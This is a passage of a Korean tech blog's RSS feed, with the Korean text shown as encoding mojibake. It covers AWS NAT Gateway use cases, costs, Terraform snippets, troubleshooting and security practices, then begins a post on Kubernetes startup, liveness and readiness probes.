class="code"><pre><span class="line">í”„ë¼ì´ë¹— ì„œë¸Œë„·ì˜ RDS â†’ NAT Gateway â†’ ì™¸ë¶€ API</span><br></pre></td></tr></table></figure><ul><li>ë³´ì•ˆ íŒ¨ì¹˜ ë‹¤ìš´ë¡œë“œ</li><li>ì™¸ë¶€ API í˜¸ì¶œ</li><li>ë°±ì—… ë°ì´í„° ì „ì†¡</li></ul><h3 id="2-í”„ë¼ì´ë¹—-ì»´í“¨íŒ…-ë¦¬ì†ŒìŠ¤ì˜-ì¸í„°ë„·-ì ‘ê·¼"><a href="#2-í”„ë¼ì´ë¹—-ì»´í“¨íŒ…-ë¦¬ì†ŒìŠ¤ì˜-ì¸í„°ë„·-ì ‘ê·¼" class="headerlink" title="2. í”„ë¼ì´ë¹— ì»´í“¨íŒ… ë¦¬ì†ŒìŠ¤ì˜ ì¸í„°ë„· ì ‘ê·¼"></a>2. í”„ë¼ì´ë¹— ì»´í“¨íŒ… ë¦¬ì†ŒìŠ¤ì˜ ì¸í„°ë„· ì ‘ê·¼</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Lambda (VPC ë‚´ë¶€) â†’ NAT Gateway â†’ ì™¸ë¶€ ì„œë¹„ìŠ¤</span><br><span class="line">ECS Task (Private) â†’ NAT Gateway â†’ Docker Hub</span><br></pre></td></tr></table></figure><h3 id="3-ì†Œí”„íŠ¸ì›¨ì–´-ì—…ë°ì´íŠ¸-ë°-íŒ¨í‚¤ì§€-ì„¤ì¹˜"><a href="#3-ì†Œí”„íŠ¸ì›¨ì–´-ì—…ë°ì´íŠ¸-ë°-íŒ¨í‚¤ì§€-ì„¤ì¹˜" class="headerlink" title="3. ì†Œí”„íŠ¸ì›¨ì–´ ì—…ë°ì´íŠ¸ ë° íŒ¨í‚¤ì§€ ì„¤ì¹˜"></a>3. ì†Œí”„íŠ¸ì›¨ì–´ ì—…ë°ì´íŠ¸ ë° íŒ¨í‚¤ì§€ ì„¤ì¹˜</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># í”„ë¼ì´ë¹— EC2ì—ì„œ íŒ¨í‚¤ì§€ ì„¤ì¹˜</span></span><br><span class="line">sudo yum update -y</span><br><span class="line">sudo yum install -y nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># NAT Gatewayë¥¼ í†µí•´ yum ì €ì¥ì†Œ ì ‘ê·¼</span></span><br></pre></td></tr></table></figure><h3 id="4-ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤-ì•„í‚¤í…ì²˜"><a href="#4-ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤-ì•„í‚¤í…ì²˜" class="headerlink" title="4. ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ì•„í‚¤í…ì²˜"></a>4. ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ì•„í‚¤í…ì²˜</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Subnet:</span><br><span class="line">â”œâ”€ API Service â†’ NAT Gateway â†’ ì™¸ë¶€ ê²°ì œ API</span><br><span class="line">â”œâ”€ Worker Service â†’ NAT Gateway â†’ ì™¸ë¶€ ì´ë©”ì¼ ì„œë¹„ìŠ¤</span><br><span class="line">â””â”€ Batch Job â†’ NAT Gateway â†’ ì™¸ë¶€ ë°ì´í„° ì†ŒìŠ¤</span><br></pre></td></tr></table></figure><h2 id="NAT-Gateway-vs-Internet-Gateway"><a href="#NAT-Gateway-vs-Internet-Gateway" class="headerlink" title="NAT Gateway vs Internet Gateway"></a>NAT Gateway vs Internet Gateway</h2><table><thead><tr><th>íŠ¹ì§•</th><th>NAT Gateway</th><th>Internet Gateway</th></tr></thead><tbody><tr><td>ìœ„ì¹˜</td><td>Public Subnet</td><td>VPC ë ˆë²¨</td></tr><tr><td>ì£¼ìš” ì—­í• </td><td>Private â†’ Internet</td><td>Public â†” Internet</td></tr><tr><td>IP ë³€í™˜</td><td>ìˆ˜í–‰ (Private â†’ Public)</td><td>ìˆ˜í–‰í•˜ì§€ ì•ŠìŒ</td></tr><tr><td>ì¸ë°”ìš´ë“œ</td><td>ì°¨ë‹¨</td><td>í—ˆìš©</td></tr><tr><td>ì•„ì›ƒë°”ìš´ë“œ</td><td>í—ˆìš©</td><td>í—ˆìš©</td></tr><tr><td>ë¹„ìš©</td><td>ì‹œê°„ë‹¹ + ë°ì´í„° ì „ì†¡ëŸ‰</td><td>ë¬´ë£Œ (ë°ì´í„° ì „ì†¡ëŸ‰ë§Œ)</td></tr></tbody></table><h2 id="ë¹„ìš©-ìµœì í™”-ë°©ë²•"><a href="#ë¹„ìš©-ìµœì í™”-ë°©ë²•" class="headerlink" title="ë¹„ìš© ìµœì í™” ë°©ë²•"></a>ë¹„ìš© ìµœì í™” ë°©ë²•</h2><h3 id="1-NAT-Gateway-í†µí•©"><a href="#1-NAT-Gateway-í†µí•©" class="headerlink" title="1. NAT Gateway í†µí•©"></a>1. NAT Gateway í†µí•©</h3><p>ì—¬ëŸ¬ í”„ë¼ì´ë¹— ì„œë¸Œë„·ì´ í•˜ë‚˜ì˜ NAT Gatewayë¥¼ ê³µìœ í•˜ë„ë¡ ì„¤ì •</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Multiple Private Subnets â†’ Single NAT Gateway</span><br></pre></td></tr></table></figure><h3 id="2-VPC-Endpoint-í™œìš©"><a href="#2-VPC-Endpoint-í™œìš©" class="headerlink" title="2. VPC Endpoint í™œìš©"></a>2. VPC Endpoint í™œìš©</h3><p>AWS ì„œë¹„ìŠ¤ ì ‘ê·¼ ì‹œ NAT Gateway ëŒ€ì‹  VPC Endpoint ì‚¬ìš©</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># S3 VPC Endpoint</span><br><span class="line">resource &quot;aws_vpc_endpoint&quot; &quot;s3&quot; &#123;</span><br><span class="line">  vpc_id       = aws_vpc.main.id</span><br><span class="line">  service_name = &quot;com.amazonaws.region.s3&quot;</span><br><span class="line"></span><br><span class="line">  route_table_ids = [aws_route_table.private.id]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ë¹„ìš© ì ˆê°:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before: Private Instance â†’ NAT Gateway â†’ S3 (ë°ì´í„° ì „ì†¡ ë¹„ìš© ë°œìƒ)</span><br><span class="line">After:  Private Instance â†’ VPC Endpoint â†’ S3 (ë¹„ìš© ì—†ìŒ)</span><br></pre></td></tr></table></figure><h3 id="3-ë°ì´í„°-ì „ì†¡-ìµœì†Œí™”"><a href="#3-ë°ì´í„°-ì „ì†¡-ìµœì†Œí™”" class="headerlink" title="3. ë°ì´í„° ì „ì†¡ ìµœì†Œí™”"></a>3. ë°ì´í„° ì „ì†¡ ìµœì†Œí™”</h3><ul><li>ë¶ˆí•„ìš”í•œ ì™¸ë¶€ API í˜¸ì¶œ ì¤„ì´ê¸°</li><li>ìºì‹± í™œìš©</li><li>ë°°ì¹˜ ì²˜ë¦¬ë¡œ ìš”ì²­ íšŸìˆ˜ ê°ì†Œ</li></ul><h3 id="4-NAT-Instance-ê³ ë ¤"><a href="#4-NAT-Instance-ê³ ë ¤" class="headerlink" title="4. NAT Instance ê³ ë ¤"></a>4. NAT Instance ê³ ë ¤</h3><p>íŠ¸ë˜í”½ì´ ì ì€ ê°œë°œ&#x2F;í…ŒìŠ¤íŠ¸ í™˜ê²½ì—ì„œëŠ” NAT Instance ì‚¬ìš© ê²€í† </p><h2 id="ëª¨ë‹ˆí„°ë§-ë°-íŠ¸ëŸ¬ë¸”ìŠˆíŒ…"><a href="#ëª¨ë‹ˆí„°ë§-ë°-íŠ¸ëŸ¬ë¸”ìŠˆíŒ…" class="headerlink" title="ëª¨ë‹ˆí„°ë§ ë° íŠ¸ëŸ¬ë¸”ìŠˆíŒ…"></a>ëª¨ë‹ˆí„°ë§ ë° íŠ¸ëŸ¬ë¸”ìŠˆíŒ…</h2><h3 id="CloudWatch-ë©”íŠ¸ë¦­"><a href="#CloudWatch-ë©”íŠ¸ë¦­" class="headerlink" title="CloudWatch ë©”íŠ¸ë¦­"></a>CloudWatch ë©”íŠ¸ë¦­</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NAT Gateway ëª¨ë‹ˆí„°ë§</span></span><br><span class="line">- BytesInFromDestination: ì¸í„°ë„· â†’ NAT Gateway</span><br><span class="line">- BytesInFromSource: í”„ë¼ì´ë¹— ì„œë¸Œë„· â†’ NAT Gateway</span><br><span class="line">- BytesOutToDestination: NAT Gateway â†’ ì¸í„°ë„·</span><br><span class="line">- BytesOutToSource: NAT Gateway â†’ í”„ë¼ì´ë¹— ì„œë¸Œë„·</span><br><span class="line">- ConnectionAttemptCount: ì—°ê²° ì‹œë„ íšŸìˆ˜</span><br><span class="line">- ConnectionEstablishedCount: ì„±ê³µí•œ ì—°ê²° ìˆ˜</span><br><span class="line">- ErrorPortAllocation: í¬íŠ¸ í• ë‹¹ ì˜¤ë¥˜</span><br><span class="line">- PacketsDropCount: ë“œë¡­ëœ íŒ¨í‚· ìˆ˜</span><br></pre></td></tr></table></figure><h3 id="ì¼ë°˜ì ì¸-ë¬¸ì œ-í•´ê²°"><a href="#ì¼ë°˜ì ì¸-ë¬¸ì œ-í•´ê²°" class="headerlink" title="ì¼ë°˜ì ì¸ ë¬¸ì œ í•´ê²°"></a>ì¼ë°˜ì ì¸ ë¬¸ì œ í•´ê²°</h3><p><strong>1. í”„ë¼ì´ë¹— ì¸ìŠ¤í„´ìŠ¤ê°€ ì¸í„°ë„· ì ‘ê·¼ ë¶ˆê°€</strong></p><p>ì²´í¬ë¦¬ìŠ¤íŠ¸:</p><ul><li>NAT Gatewayê°€ Public Subnetì— ìˆëŠ”ì§€ í™•ì¸</li><li>Elastic IPê°€ NAT Gatewayì— ì—°ê²°ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸</li><li>Private Subnetì˜ ë¼ìš°íŒ… í…Œì´ë¸”ì— NAT Gatewayê°€ ì„¤ì •ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸</li><li>ë³´ì•ˆ ê·¸ë£¹ê³¼ Network ACL í™•ì¸</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ë¼ìš°íŒ… í…Œì´ë¸” í™•ì¸</span></span><br><span class="line">aws ec2 describe-route-tables --route-table-id rtb-xxxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># NAT Gateway ìƒíƒœ í™•ì¸</span></span><br><span class="line">aws ec2 describe-nat-gateways --nat-gateway-ids nat-xxxxx</span><br></pre></td></tr></table></figure><p><strong>2. ì—°ê²° íƒ€ì„ì•„ì›ƒ</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NAT Gateway ìƒíƒœê°€ &#x27;available&#x27;ì¸ì§€ í™•ì¸</span></span><br><span class="line">aws ec2 describe-nat-gateways \</span><br><span class="line">    --nat-gateway-ids nat-xxxxx \</span><br><span class="line">    --query <span class="string">&#x27;NatGateways[0].State&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># VPC Flow Logs í™•ì¸</span></span><br><span class="line">aws ec2 describe-flow-logs --filter <span class="string">&quot;Name=resource-id,Values=eni-xxxxx&quot;</span></span><br></pre></td></tr></table></figure><p><strong>3. í¬íŠ¸ í• ë‹¹ ì˜¤ë¥˜</strong></p><p>NAT GatewayëŠ” í•˜ë‚˜ì˜ IPì—ì„œ ì•½ 55,000ê°œì˜ ë™ì‹œ ì—°ê²° ì§€ì›. ì´ˆê³¼ ì‹œ:</p><ul><li>ì—¬ëŸ¬ NAT Gateway ì‚¬ìš©</li><li>ì—°ê²° í’€ë§ ìµœì í™”</li><li>ë¶ˆí•„ìš”í•œ ì—°ê²° ì¢…ë£Œ</li></ul><h2 id="ë³´ì•ˆ-ëª¨ë²”-ì‚¬ë¡€"><a href="#ë³´ì•ˆ-ëª¨ë²”-ì‚¬ë¡€" class="headerlink" title="ë³´ì•ˆ ëª¨ë²” ì‚¬ë¡€"></a>ë³´ì•ˆ ëª¨ë²” ì‚¬ë¡€</h2><h3 id="1-Network-ACL-ì„¤ì •"><a href="#1-Network-ACL-ì„¤ì •" class="headerlink" title="1. Network ACL ì„¤ì •"></a>1. Network ACL ì„¤ì •</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inbound Rules (Private Subnet):</span><br><span class="line">- Allow from NAT Gateway IP</span><br><span class="line">- Deny all other</span><br><span class="line"></span><br><span class="line">Outbound Rules (Private Subnet):</span><br><span class="line">- Allow to 0.0.0.0/0</span><br></pre></td></tr></table></figure><h3 id="2-ìµœì†Œ-ê¶Œí•œ-ì›ì¹™"><a href="#2-ìµœì†Œ-ê¶Œí•œ-ì›ì¹™" class="headerlink" title="2. ìµœì†Œ ê¶Œí•œ ì›ì¹™"></a>2. ìµœì†Œ ê¶Œí•œ ì›ì¹™</h3><p>í”„ë¼ì´ë¹— ë¦¬ì†ŒìŠ¤ëŠ” í•„ìš”í•œ ì™¸ë¶€ ì—”ë“œí¬ì¸íŠ¸ë§Œ ì ‘ê·¼í•˜ë„ë¡ ì œí•œ</p><h3 id="3-VPC-Flow-Logs-í™œì„±í™”"><a href="#3-VPC-Flow-Logs-í™œì„±í™”" class="headerlink" title="3. VPC Flow Logs í™œì„±í™”"></a>3. VPC Flow Logs í™œì„±í™”</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource &quot;aws_flow_log&quot; &quot;nat_gateway&quot; &#123;</span><br><span class="line">  vpc_id          = aws_vpc.main.id</span><br><span class="line">  traffic_type    = &quot;ALL&quot;</span><br><span class="line">  iam_role_arn    = aws_iam_role.flow_logs.arn</span><br><span class="line">  log_destination = aws_cloudwatch_log_group.flow_logs.arn</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-ì •ê¸°ì ì¸-ëª¨ë‹ˆí„°ë§"><a href="#4-ì •ê¸°ì ì¸-ëª¨ë‹ˆí„°ë§" class="headerlink" title="4. ì •ê¸°ì ì¸ ëª¨ë‹ˆí„°ë§"></a>4. ì •ê¸°ì ì¸ ëª¨ë‹ˆí„°ë§</h3><ul><li>ë¹„ì •ìƒì ì¸ íŠ¸ë˜í”½ íŒ¨í„´ íƒì§€</li><li>ë¹„ìš© ì´ìƒ ì¦ê°€ ì•Œë¦¼ ì„¤ì •</li><li>ì—°ê²° ì‹¤íŒ¨ ë¡œê·¸ ê²€í† </li></ul><h2 id="NAT-Gatewayì˜-ì¥ë‹¨ì "><a href="#NAT-Gatewayì˜-ì¥ë‹¨ì " class="headerlink" title="NAT Gatewayì˜ ì¥ë‹¨ì "></a>NAT Gatewayì˜ ì¥ë‹¨ì </h2><h3 id="ì¥ì "><a href="#ì¥ì " class="headerlink" title="ì¥ì "></a>ì¥ì </h3><ol><li><strong>ë†’ì€ ê°€ìš©ì„±</strong>: ìë™ìœ¼ë¡œ ì´ì¤‘í™”ë˜ì–´ ë‹¨ì¼ ì¥ì•  ì§€ì  ì œê±°</li><li><strong>í™•ì¥ì„±</strong>: ìë™ìœ¼ë¡œ ìµœëŒ€ 45Gbpsê¹Œì§€ í™•ì¥</li><li><strong>ê´€ë¦¬ í¸ì˜ì„±</strong>: íŒ¨ì¹˜, ì—…ë°ì´íŠ¸ ë¶ˆí•„ìš”</li><li><strong>ë³´ì•ˆ</strong>: ì™¸ë¶€ì—ì„œ ì‹œì‘ë˜ëŠ” ì—°ê²° ìë™ ì°¨ë‹¨</li><li><strong>ì„±ëŠ¥</strong>: ë†’ì€ ëŒ€ì—­í­ê³¼ ë‚®ì€ ì§€ì—°ì‹œê°„</li></ol><h3 id="ë‹¨ì "><a href="#ë‹¨ì " class="headerlink" title="ë‹¨ì "></a>ë‹¨ì </h3><ol><li><strong>ë¹„ìš©</strong>: ì‹œê°„ë‹¹ ìš”ê¸ˆ + ë°ì´í„° ì „ì†¡ ë¹„ìš©</li><li><strong>ìœ ì—°ì„± ì œí•œ</strong>: ì»¤ìŠ¤í„°ë§ˆì´ì§• ë¶ˆê°€</li><li><strong>ë³´ì•ˆ ê·¸ë£¹ ë¯¸ì§€ì›</strong>: Network ACLë§Œ ì‚¬ìš© ê°€ëŠ¥</li><li><strong>í¬íŠ¸ í¬ì›Œë”© ë¶ˆê°€</strong>: ì¸ë°”ìš´ë“œ ì—°ê²° ì„¤ì • ë¶ˆê°€</li></ol><h2 id="ì°¸ê³ -ìë£Œ"><a href="#ì°¸ê³ -ìë£Œ" class="headerlink" title="ì°¸ê³  ìë£Œ"></a>ì°¸ê³  ìë£Œ</h2><ul><li><a href="https://docs.aws.amazon.com/vpc/latest/userguide/vpc-nat-gateway.html">AWS NAT Gateway Documentation</a></li><li><a href="https://docs.aws.amazon.com/vpc/latest/userguide/vpc-nat-comparison.html">NAT Gateway vs NAT Instance</a></li><li><a href="https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints.html">VPC Endpoints</a></li><li><a href="https://cloud.google.com/nat/docs/overview">Google Cloud NAT</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/CS/">CS</category>
      
      <category domain="https://ckck803.github.io/categories/CS/Network/">Network</category>
      
      
      
      <comments>https://ckck803.github.io/2025/12/28/computer-science/network/nat-gateway/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[ì¿ ë²„ë„¤í‹°ìŠ¤] - Health Probes (Startup, Liveness, Readiness)</title>
      <link>https://ckck803.github.io/2025/12/26/k8s/pod/health-probes/</link>
      <guid>https://ckck803.github.io/2025/12/26/k8s/pod/health-probes/</guid>
      <pubDate>Fri, 26 Dec 2025 01:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/k8s/k8s.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ê°œìš”&quot;&gt;&lt;a href=&quot;#ê°œìš”&quot; class=&quot;headerlink&quot; title=&quot;ê°œìš”&quot;&gt;&lt;/a&gt;ê°œìš”&lt;/h2&gt;&lt;p&gt;ì¿ ë²„ë„¤í‹°ìŠ¤ëŠ” ì»¨í…Œì´ë„ˆì˜ ìƒíƒœë¥¼ ëª¨ë‹ˆí„°ë§í•˜ê³  ê´€ë¦¬í•˜ê¸° ìœ„í•´ ì„¸ ê°€ì§€ ìœ í˜•ì˜ Health Probeë¥¼ ì œê³µí•©ë‹ˆë‹¤:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Startup Probe&lt;/strong&gt;: ì»¨í…Œì´ë„ˆê°€ ì‹œì‘ë˜ì—ˆëŠ”ì§€ í™•ì¸&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Liveness Probe&lt;/strong&gt;: ì»¨í…Œì´ë„ˆê°€ ì •ìƒì ìœ¼ë¡œ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Readiness Probe&lt;/strong&gt;: ì»¨í…Œì´ë„ˆê°€ íŠ¸ë˜í”½ì„ ë°›ì„ ì¤€ë¹„ê°€ ë˜ì—ˆëŠ”ì§€ í™•ì¸&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Probe-ë©”ì»¤ë‹ˆì¦˜&quot;&gt;&lt;a href=&quot;#Probe-ë©”ì»¤ë‹ˆì¦˜&quot; class=&quot;headerlink&quot; title=&quot;Probe ë©”ì»¤ë‹ˆì¦˜&quot;&gt;&lt;/a&gt;Probe ë©”ì»¤ë‹ˆì¦˜&lt;/h2&gt;&lt;p&gt;ëª¨ë“  ProbeëŠ” ë‹¤ìŒ ì„¸ ê°€ì§€ ë°©ì‹ ì¤‘ í•˜ë‚˜ë¡œ ë™ì‘í•©ë‹ˆë‹¤:&lt;/p&gt;
&lt;h3 id=&quot;1-HTTP-GET-ìš”ì²­&quot;&gt;&lt;a href=&quot;#1-HTTP-GET-ìš”ì²­&quot; class=&quot;headerlink&quot; title=&quot;1. HTTP GET ìš”ì²­&quot;&gt;&lt;/a&gt;1. HTTP GET ìš”ì²­&lt;/h3&gt;&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;httpGet:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;path:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;/healthz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;port:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;8080&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;httpHeaders:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;Custom-Header&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;value:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;Awesome&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;scheme:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;HTTP&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;# or HTTPS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;ì§€ì •ëœ ê²½ë¡œë¡œ HTTP GET ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤&lt;/li&gt;
&lt;li&gt;200-399 ë²”ìœ„ì˜ ìƒíƒœ ì½”ë“œë¥¼ ë°˜í™˜í•˜ë©´ ì„±ê³µ&lt;/li&gt;
&lt;li&gt;ê·¸ ì™¸ì˜ ì½”ë“œëŠ” ì‹¤íŒ¨ë¡œ ê°„ì£¼&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2-TCP-Socket-ì—°ê²°&quot;&gt;&lt;a href=&quot;#2-TCP-Socket-ì—°ê²°&quot; class=&quot;headerlink&quot; title=&quot;2. TCP Socket ì—°ê²°&quot;&gt;&lt;/a&gt;2. TCP Socket ì—°ê²°&lt;/h3&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/k8s/k8s.png"></p><h2 id="ê°œìš”"><a href="#ê°œìš”" class="headerlink" title="ê°œìš”"></a>ê°œìš”</h2><p>ì¿ ë²„ë„¤í‹°ìŠ¤ëŠ” ì»¨í…Œì´ë„ˆì˜ ìƒíƒœë¥¼ ëª¨ë‹ˆí„°ë§í•˜ê³  ê´€ë¦¬í•˜ê¸° ìœ„í•´ ì„¸ ê°€ì§€ ìœ í˜•ì˜ Health Probeë¥¼ ì œê³µí•©ë‹ˆë‹¤:</p><ul><li><strong>Startup Probe</strong>: ì»¨í…Œì´ë„ˆê°€ ì‹œì‘ë˜ì—ˆëŠ”ì§€ í™•ì¸</li><li><strong>Liveness Probe</strong>: ì»¨í…Œì´ë„ˆê°€ ì •ìƒì ìœ¼ë¡œ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸</li><li><strong>Readiness Probe</strong>: ì»¨í…Œì´ë„ˆê°€ íŠ¸ë˜í”½ì„ ë°›ì„ ì¤€ë¹„ê°€ ë˜ì—ˆëŠ”ì§€ í™•ì¸</li></ul><h2 id="Probe-ë©”ì»¤ë‹ˆì¦˜"><a href="#Probe-ë©”ì»¤ë‹ˆì¦˜" class="headerlink" title="Probe ë©”ì»¤ë‹ˆì¦˜"></a>Probe ë©”ì»¤ë‹ˆì¦˜</h2><p>ëª¨ë“  ProbeëŠ” ë‹¤ìŒ ì„¸ ê°€ì§€ ë°©ì‹ ì¤‘ í•˜ë‚˜ë¡œ ë™ì‘í•©ë‹ˆë‹¤:</p><h3 id="1-HTTP-GET-ìš”ì²­"><a href="#1-HTTP-GET-ìš”ì²­" class="headerlink" title="1. HTTP GET ìš”ì²­"></a>1. HTTP GET ìš”ì²­</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">httpGet:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">  <span class="attr">httpHeaders:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Custom-Header</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">Awesome</span></span><br><span class="line">  <span class="attr">scheme:</span> <span class="string">HTTP</span>  <span class="comment"># or HTTPS</span></span><br></pre></td></tr></table></figure><ul><li>ì§€ì •ëœ ê²½ë¡œë¡œ HTTP GET ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤</li><li>200-399 ë²”ìœ„ì˜ ìƒíƒœ ì½”ë“œë¥¼ ë°˜í™˜í•˜ë©´ ì„±ê³µ</li><li>ê·¸ ì™¸ì˜ ì½”ë“œëŠ” ì‹¤íŒ¨ë¡œ ê°„ì£¼</li></ul><h3 id="2-TCP-Socket-ì—°ê²°"><a href="#2-TCP-Socket-ì—°ê²°" class="headerlink" title="2. TCP Socket ì—°ê²°"></a>2. TCP Socket ì—°ê²°</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tcpSocket:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><ul><li>ì§€ì •ëœ í¬íŠ¸ë¡œ TCP ì—°ê²°ì„ ì‹œë„í•©ë‹ˆë‹¤</li><li>ì—°ê²°ì´ ì„±ê³µí•˜ë©´ ì„±ê³µ</li><li>ì—°ê²°ì´ ì‹¤íŒ¨í•˜ë©´ ì‹¤íŒ¨ë¡œ ê°„ì£¼</li></ul><h3 id="3-Exec-ëª…ë ¹-ì‹¤í–‰"><a href="#3-Exec-ëª…ë ¹-ì‹¤í–‰" class="headerlink" title="3. Exec ëª…ë ¹ ì‹¤í–‰"></a>3. Exec ëª…ë ¹ ì‹¤í–‰</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">exec:</span></span><br><span class="line">  <span class="attr">command:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/tmp/healthy</span></span><br></pre></td></tr></table></figure><ul><li>ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤</li><li>Exit code 0ì„ ë°˜í™˜í•˜ë©´ ì„±ê³µ</li><li>ê·¸ ì™¸ì˜ ì½”ë“œëŠ” ì‹¤íŒ¨ë¡œ ê°„ì£¼</li></ul><h2 id="Probe-ê³µí†µ-ì„¤ì •"><a href="#Probe-ê³µí†µ-ì„¤ì •" class="headerlink" title="Probe ê³µí†µ ì„¤ì •"></a>Probe ê³µí†µ ì„¤ì •</h2><p>ëª¨ë“  Probeì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê³µí†µ íŒŒë¼ë¯¸í„°:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">initialDelaySeconds:</span> <span class="number">0</span>      <span class="comment"># ì»¨í…Œì´ë„ˆ ì‹œì‘ í›„ probe ì‹œì‘ ì „ ëŒ€ê¸° ì‹œê°„ (ê¸°ë³¸: 0ì´ˆ)</span></span><br><span class="line"><span class="attr">periodSeconds:</span> <span class="number">10</span>           <span class="comment"># probe ì‹¤í–‰ ê°„ê²© (ê¸°ë³¸: 10ì´ˆ)</span></span><br><span class="line"><span class="attr">timeoutSeconds:</span> <span class="number">1</span>           <span class="comment"># probe íƒ€ì„ì•„ì›ƒ ì‹œê°„ (ê¸°ë³¸: 1ì´ˆ)</span></span><br><span class="line"><span class="attr">successThreshold:</span> <span class="number">1</span>         <span class="comment"># ì‹¤íŒ¨ í›„ ì„±ê³µìœ¼ë¡œ ê°„ì£¼í•˜ê¸° ìœ„í•œ ì—°ì† ì„±ê³µ íšŸìˆ˜ (ê¸°ë³¸: 1)</span></span><br><span class="line"><span class="attr">failureThreshold:</span> <span class="number">3</span>         <span class="comment"># ì„±ê³µ í›„ ì‹¤íŒ¨ë¡œ ê°„ì£¼í•˜ê¸° ìœ„í•œ ì—°ì† ì‹¤íŒ¨ íšŸìˆ˜ (ê¸°ë³¸: 3)</span></span><br></pre></td></tr></table></figure><h2 id="ğŸ“-1-Startup-Probe-ê¸°ë™ì€-ëë‚¬ë‹ˆ"><a href="#ğŸ“-1-Startup-Probe-ê¸°ë™ì€-ëë‚¬ë‹ˆ" class="headerlink" title="ğŸ“ 1. Startup Probe - ê¸°ë™ì€ ëë‚¬ë‹ˆ?"></a>ğŸ“ 1. Startup Probe - ê¸°ë™ì€ ëë‚¬ë‹ˆ?</h2><h3 id="ëª©ì "><a href="#ëª©ì " class="headerlink" title="ëª©ì "></a>ëª©ì </h3><ul><li>ì»¨í…Œì´ë„ˆ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ <strong>ì‹œì‘ë˜ì—ˆëŠ”ì§€</strong> í™•ì¸</li><li>ì‹œì‘ì´ ëŠë¦° ì• 